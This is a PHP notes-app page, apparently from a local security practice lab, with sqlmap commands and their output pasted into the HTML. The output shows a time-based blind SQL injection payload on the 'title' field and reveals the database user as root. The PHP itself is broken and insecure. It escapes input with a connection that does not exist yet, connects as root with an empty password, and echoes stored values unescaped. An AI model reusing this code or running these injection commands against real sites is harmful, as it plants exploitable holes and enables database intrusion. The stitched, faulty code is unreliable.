<?php
$servername="localhost";
$username="root";
$password="";
$database="crud";

// vulneribility
$title = mysqli_real_escape_string($con, $_POST['title']);
$hashed_password = password_hash($password, PASSWORD_DEFAULT);



$con = mysqli_connect($servername, $username, $password, $database);

if(!$con){
    die("Connection not established");
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CRUD Operation</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <h1>Add note</h1>
    <hr>
    <form method="POST" action="add.php">

        Title:<br> <input type="text" class="int" name="title" id="title" placeholder="Add your title here" required=""><br>
        Description:<br> <input type="text" class="int" name="descr" id="descr"
            placeholder="Description about the note" required=""><br>
             <hr>
        <button type="submit" name="sub" class="sub">Add Note</button>

    </form>
    </div>

    <div class="selection">
        <?php

    $sqlselect = "SELECT * FROM `notes`;";
    $result = mysqli_query($con, $sqlselect);
?>

        <h1>Your Notes</h1>
        <table>
            <thead>
                <tr>
                    <th>S.N.</th>
                    <th>Title</th>
                    <th>Description</th>
                    <th>Time</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody>

                <?php
    while($row = mysqli_fetch_assoc($result)){
// echo $row['Sr.No']. "<br>title = " .$row['title']. "<br>description= ".$row['descr']."<br><br>"
        echo " <tr>
        <td>".$row['Sr.No']."</td>
        <td>".$row['title']."</td>
        <td>".$row['descr']."</td>
        <td>".$row['Time']."</td>
        <td>
         <a href='edit.php'><button name='edit' class='sub'>Edit</button></a>
             <a href='delete.php'><button type='submit' name='delete' class='sub'>Delete</button></a>
           
        </td>
    </tr>";        
   }

   ?>
            </tbody>
        </table>

    </div>

    <br>
     <hr>
    Note:
    <p><a href="./reset_table.php" class="sub">Click here</a> to reset Serial number.</p>
     <hr>
        <!-- <div class="deletion">

    </div> -->
</body>


sqlmap -u 'http://localhost/CRUD-Operation/add.php' -p 'title' --data="title=test&descr=test&sub=" --risk=3 --level=3 --method='POST' -D 'crud'
---
Parameter: title (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: title=test' RLIKE SLEEP(5) AND 'FxIv'='FxIv&descr=test&sub=
---
sqlmap -u 'http://localhost/CRUD-Operation/add.php' -p 'title' --data="title=test&descr=test&sub=" --risk=3 --level=3 --method='POST' -D 'crud' -T 'notes' --is-dba --current-user
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: title (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: title=test' RLIKE SLEEP(5) AND 'FxIv'='FxIv&descr=test&sub=
---

root@localhost
current user: 'root@localhost'

</html>